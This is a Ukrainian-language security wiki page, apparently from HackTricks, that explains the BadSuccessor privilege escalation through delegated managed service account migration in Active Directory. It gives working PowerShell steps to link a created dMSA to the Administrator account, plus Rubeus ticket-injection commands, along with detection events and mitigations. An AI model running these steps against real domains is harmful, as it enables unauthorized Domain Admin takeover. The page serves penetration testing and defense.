# BadSuccessor: Підвищення привілеїв через зловживання міграцією Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Delegated Managed Service Accounts (**dMSA**) є наступниками нового покоління **gMSA**, які з'явилися у Windows Server 2025. Легітимний workflow міграції дає адміністраторам змогу замінити *старий* account (user, computer або service account) на dMSA, прозоро зберігаючи permissions. Workflow доступний через PowerShell cmdlets, такі як `Start-ADServiceAccountMigration` і `Complete-ADServiceAccountMigration`, та використовує два LDAP attributes **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* на замінений (старий) account.
* **`msDS-DelegatedMSAState`**       – стан міграції (`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>

Якщо attacker може створити **будь-який** dMSA всередині OU і безпосередньо змінити ці 2 attributes, LSASS і KDC сприйматимуть dMSA як *successor* пов'язаного account. Коли attacker згодом автентифікується як dMSA, **він успадковує всі privileges пов'язаного account** – аж до **Domain Admin**, якщо пов'язано account Administrator.<sup>[[1]](#references)</sup>

Цю техніку Unit 42 у 2025 році назвала **BadSuccessor**. На момент написання **security patch** відсутній; проблему пом'якшує лише hardening permissions OU.<sup>[[1]](#references)[[2]](#references)</sup>

### Передумови атаки

1. Account, якому *дозволено* створювати objects всередині **Organizational Unit (OU)** *і* який має принаймні одне з наведеного:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. Network connectivity до LDAP і Kerberos (стандартний domain joined scenario / remote attack).<sup>[[1]](#references)</sup>

## Перелік вразливих OU

Unit 42 випустила PowerShell helper script, який аналізує security descriptors кожного OU та виділяє необхідні ACEs:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
За лаштунками скрипт виконує посторінковий пошук LDAP для `(objectClass=organizationalUnit)` і перевіряє кожен `nTSecurityDescriptor` на наявність

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (клас об’єктів *msDS-DelegatedManagedServiceAccount*)

## Кроки експлуатації

Щойно визначено OU з правом запису, для атаки потрібно лише 3 LDAP-записи:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Після реплікації attacker може просто виконати **logon** як `attacker_dMSA$` або запросити Kerberos TGT — Windows побудує токен *заміненого* облікового запису.<sup>[[1]](#references)</sup>

### Автоматизація

Кілька публічних PoC охоплюють увесь робочий процес, включно з отриманням пароля та керуванням квитками:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Виявлення та пошук

Увімкніть **Object Auditing** на OU та відстежуйте такі Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – створення об'єкта **dMSA**
* **5136** – зміна **`msDS-ManagedAccountPrecededByLink`**
* **4662** – зміни певних атрибутів
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – видача TGT для dMSA

Кореляція подій `4662` (зміна атрибута), `4741` (створення облікового запису комп'ютера/сервісу) та `4624` (подальший вхід) швидко виявляє активність BadSuccessor. XDR-рішення, такі як **XSIAM**, постачаються з готовими до використання запитами (див. посилання).<sup>[[2]](#references)</sup>

## Пом'якшення

* Застосовуйте принцип **найменших привілеїв** – делегуйте керування *Service Account* лише довіреним ролям.
* Видаліть `Create Child` / `msDS-DelegatedManagedServiceAccount` з OU, яким це явно не потрібно.
* Відстежуйте перелічені вище ідентифікатори подій і створюйте сповіщення, якщо ідентичності, що належать до *non-Tier-0*, створюють або редагують dMSA.

## Див. також


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Посилання

- [1] [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
